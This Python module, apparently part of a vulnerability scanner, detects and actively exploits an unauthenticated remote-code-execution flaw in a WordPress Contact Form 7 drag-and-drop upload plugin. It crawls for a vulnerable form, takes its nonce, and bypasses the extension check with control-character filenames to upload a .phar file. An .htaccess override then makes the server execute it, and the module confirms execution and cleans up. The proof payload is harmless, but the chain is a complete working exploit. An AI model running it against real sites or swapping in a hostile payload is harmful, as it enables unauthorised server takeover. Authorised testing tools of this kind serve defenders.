from __future__ import annotations

import json
import re
from typing import Any
from urllib.parse import urljoin, urlsplit

from ...core.evidence import generate_php_math_payload, verify_php_execution
from ...core.http import HttpSession, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.probes import rand_str
from ...core.versions import parse_version_safe
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2026-18781"
NAME = "Drag and Drop Multiple File Upload for CF7 unauthenticated RCE via control-character filename"
COMPONENT = "WordPress plugin Drag and Drop Multiple File Upload for Contact Form 7"
AFFECTED_RULE = "Drag and Drop Multiple File Upload for Contact Form 7 before 1.3.9.9"
PLUGIN_SLUG = "drag-and-drop-multiple-file-upload-contact-form-7"
PATCHED_VERSION = "1.3.9.9"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AJAX_PATH = "/wp-admin/admin-ajax.php"
UPLOAD_DIR = "/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files"
COMMON_PATHS = ("/", "/contact/", "/contact-us/", "/support/", "/about/")
MAX_CRAWL_PAGES = 20
SKIP_LINK_MARKERS = (
    "/wp-admin",
    "/wp-login",
    "wp-json",
    "xmlrpc.php",
    "?feed=",
    "/feed/",
    "mailto:",
    "javascript:",
    "#",
    ".css",
    ".js",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".svg",
    ".ico",
)
# Apache/LiteSpeed honours this per-directory override.  The plugin's parent
# .htaccess denies .phar; the child file re-enables and routes it to PHP.
HTACCESS_BODY = (
    b'<FilesMatch "\\.phar$">\n'
    b"  SetHandler application/x-httpd-php\n"
    b"  Require all granted\n"
    b"</FilesMatch>\n"
)
HTACCESS_NEUTRAL_BODY = b"# proofcms cleanup: neutralized\n"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    fixed = parse_version_safe(PATCHED_VERSION)
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "PATCHED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    return passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=classify_version,
        remediation=(
            "Upgrade the Drag and Drop Multiple File Upload for CF7 plugin to 1.3.9.9 or newer, "
            "avoid filetypes:* on public forms, and inspect wp-content/uploads/wp_dndcf7_uploads."
        ),
        exploit_available=HAS_EXPLOIT,
    )


def _attr(tag: str, name: str) -> str | None:
    match = re.search(rf'{re.escape(name)}=["\']([^"\']*)["\']', tag, re.IGNORECASE)
    return match.group(1) if match else None


def parse_dnd_form(html: str) -> dict[str, str] | None:
    """Find a drag-and-drop file field configured with the wildcard filetypes:* option."""
    nonce = re.search(r'"ajax_nonce"\s*:\s*"([^"]+)"', html)
    if not nonce:
        return None
    for match in re.finditer(r"<input\b[^>]*>", html, re.IGNORECASE):
        tag = match.group(0)
        if _attr(tag, "data-type") != "*":
            continue
        field = _attr(tag, "data-name")
        form_id = _attr(tag, "data-id")
        if field and form_id:
            return {"nonce": nonce.group(1), "field": field, "form_id": form_id}
    return None


def _same_site(base: str, url: str) -> bool:
    return urlsplit(base).netloc.lower() == urlsplit(url).netloc.lower()


def _candidate_urls(sess: HttpSession, base: str) -> list[str]:
    candidates = [f"{base}{path}" for path in COMMON_PATHS]
    homepage = sess.get("/", timeout=8)
    if homepage.get("status") == 200:
        body = str(homepage.get("body", ""))
        for href in re.findall(r'href=["\']([^"\']+)["\']', body, re.IGNORECASE):
            if any(marker in href.lower() for marker in SKIP_LINK_MARKERS):
                continue
            url = urljoin(base + "/", href)
            if not _same_site(base, url):
                continue
            if url not in candidates:
                candidates.append(url)
            if len(candidates) >= MAX_CRAWL_PAGES:
                break
    return candidates


def _discover_form(
    sess: HttpSession,
    base: str,
    form_url: str | None = None,
) -> tuple[str, dict[str, str]] | None:
    urls = [form_url] if form_url else _candidate_urls(sess, base)
    for url in urls:
        if not url:
            continue
        response = sess.get(url, timeout=8)
        if is_transport_error(response) or response.get("status") != 200:
            continue
        form = parse_dnd_form(str(response.get("body", "")))
        if form:
            return url, form
    return None


def _json(body: str) -> dict[str, Any]:
    try:
        value = json.loads(body)
    except (json.JSONDecodeError, TypeError):
        return {}
    return value if isinstance(value, dict) else {}


def _upload(
    sess: HttpSession,
    form: dict[str, str],
    folder: str,
    token: str,
    filename: str,
    content: bytes,
    timeout: int,
) -> tuple[dict[str, Any], dict[str, Any] | None]:
    fields = {
        "action": "dnd_codedropz_upload",
        "type": "click",
        "security": form["nonce"],
        "form_id": form["form_id"],
        "upload_name": form["field"],
        "upload_folder": folder,
        "token": token,
    }
    response = sess.post_multipart(
        AJAX_PATH,
        fields=fields,
        files={"upload-file": (filename, content, "application/octet-stream")},
        timeout=timeout,
    )
    if is_transport_error(response):
        return response, None
    payload = _json(str(response.get("body", "")))
    data = payload.get("data") if payload.get("success") is True else None
    return response, data if isinstance(data, dict) else None


def _delete(
    sess: HttpSession,
    form: dict[str, str],
    folder: str,
    filename: str,
    token: str,
    timeout: int,
) -> bool:
    response = sess.post(
        AJAX_PATH,
        fields={
            "action": "dnd_codedropz_upload_delete",
            "security": form["nonce"],
            "path": f"{folder}/{filename}",
            "upload_folder": folder,
            "token": token,
        },
        timeout=timeout,
    )
    payload = _json(str(response.get("body", "")))
    return payload.get("success") is True


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    form_url: str | None = None,
) -> Finding:
    base = normalize_url(target_url)
    sess = HttpSession(base, timeout=timeout, proxy=proxy)
    found = _discover_form(sess, base, form_url=form_url)
    if not found:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                "No Contact Form 7 page with a drag-and-drop [mfile] field using the non-default "
                "filetypes:* option was found. The CVE requires that administrator configuration."
            ),
            action=(
                "Verify whether a public form uses [mfile name filetypes:*]; if so, upgrade to "
                "1.3.9.9 or newer and remove the wildcard file type."
            ),
        )

    page_url, form = found
    payload, expected_product = generate_php_math_payload()
    suffix = rand_str(8)
    folder = f"proofcms{suffix}"
    token = f"proofcmstoken{suffix}"
    # Control bytes survive the plugin's extension check and are stripped later
    # by Contact Form 7's wpcf7_antiscript_file_name(), yielding .phar/.htaccess.
    phar_raw_name = f"\x01proofcms{suffix}.pha\x01r"
    htaccess_raw_name = "\x01.htacce\x01ss"

    phar_response, phar_data = _upload(
        sess, form, folder, token, phar_raw_name, payload.encode(), timeout
    )
    if is_transport_error(phar_response):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                "The .phar upload could not obtain an HTTP response "
                f"({transport_error_detail(phar_response)})."
            ),
            action="Retry when the target is reachable; do not interpret transport failure as patch status.",
        )

    if not phar_data:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=page_url,
            detail=(
                "The form's filetypes:* upload refused the control-character .phar filename. "
                f"HTTP {phar_response.get('status')}."
            ),
            action="Upgrade the plugin to 1.3.9.9 or newer and remove filetypes:* from public forms.",
            evidence={
                "form_url": page_url,
                "field": form["field"],
                "form_id": form["form_id"],
                "phar_status": phar_response.get("status"),
                "phar_body": str(phar_response.get("body", ""))[:200],
            },
        )

    phar_file = str(phar_data.get("file") or "")
    folder_name = str(phar_data.get("path") or folder)
    htaccess_response, htaccess_data = _upload(
        sess, form, folder_name, token, htaccess_raw_name, HTACCESS_BODY, timeout
    )
    htaccess_written = bool(htaccess_data)

    proof_url = f"{base}{UPLOAD_DIR}/{folder_name}/{phar_file}"
    proof = sess.get(proof_url, timeout=timeout)
    body = str(proof.get("body", ""))
    executed, source_leaked = verify_php_execution(body, expected_product)

    # Cleanup: remove the executable payload through the plugin's own delete
    # action, then overwrite the uploaded .htaccess with inert content.  The
    # delete action cannot unlink a dotfile because sanitize_file_name() strips
    # the leading dot, so neutralising it is the safest HTTP-only option.
    phar_removed = _delete(sess, form, folder_name, phar_file, token, timeout) if phar_file else False
    htaccess_neutralized = False
    if htaccess_written:
        _, neutral_data = _upload(
            sess,
            form,
            folder_name,
            token,
            htaccess_raw_name,
            HTACCESS_NEUTRAL_BODY,
            timeout,
        )
        htaccess_neutralized = bool(neutral_data)

    evidence = {
        "form_url": page_url,
        "field": form["field"],
        "form_id": form["form_id"],
        "upload_folder": folder_name,
        "phar_upload_status": phar_response.get("status"),
        "phar_file": phar_file,
        "htaccess_upload_status": htaccess_response.get("status"),
        "htaccess_written": htaccess_written,
        "htaccess_neutralized": htaccess_neutralized,
        "proof_status": proof.get("status"),
        "phar_removed": phar_removed,
    }

    if executed:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=proof_url,
            uploaded_filename=phar_file,
            detail=(
                "The unauthenticated control-character filename bypass uploaded a .phar file and a "
                ".htaccess override, and the server executed the dynamic PHP proof "
                f"({expected_product}). This confirms CVE-2026-18781."
            ),
            action=(
                "Upgrade the plugin to 1.3.9.9 or newer, remove filetypes:* from public forms, delete "
                "the proofcms upload folder, and inspect wp_dndcf7_uploads for unexpected files."
            ),
            evidence=evidence,
            cleanup_attempted=True,
            cleanup_verified=phar_removed and (htaccess_neutralized or not htaccess_written),
        )

    if source_leaked:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE_UPLOAD_ONLY",
            confidence="HIGH",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=proof_url,
            uploaded_filename=phar_file,
            detail=(
                "The control-character bypass wrote a .phar file, but the server served it as source "
                "instead of executing it. The upload primitive is confirmed; code execution depends "
                "on the web server honouring the per-directory override."
            ),
            action=(
                "Upgrade the plugin to 1.3.9.9 or newer, remove filetypes:* from public forms, and "
                "delete the proofcms upload folder."
            ),
            evidence=evidence,
            cleanup_attempted=True,
            cleanup_verified=phar_removed and (htaccess_neutralized or not htaccess_written),
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=proof_url,
        uploaded_filename=phar_file,
        detail=(
            "The control-character bypass was accepted, but the uploaded .phar did not execute. "
            "The web server may not honour .htaccess overrides or may not map .phar to PHP."
        ),
        action=(
            "Upgrade the plugin to 1.3.9.9 or newer, remove filetypes:* from public forms, and "
            "verify the web server's AllowOverride and PHP handler configuration."
        ),
        evidence=evidence,
        cleanup_attempted=True,
        cleanup_verified=phar_removed and (htaccess_neutralized or not htaccess_written),
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
):
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode != "aggressive":
        passive.detail += " This CVE requires aggressive lab-only upload verification."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        passive.detail += (
            " Aggressive proof skipped because the plugin was not detected as potentially affected."
        )
        return passive
    result = run_aggressive_probe(
        target_url,
        timeout=timeout,
        proxy=proxy,
        form_url=aggressive_command,
    )
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": ["<1.3.9.9"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.1.0",
        "last_reviewed": "2026-11-08",
        "updated": "2026-11-08",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-18781",
            "https://wpscan.com/vulnerability/fb59519b-80ae-48e4-a31a-71d24ded205b/",
        ],
    }
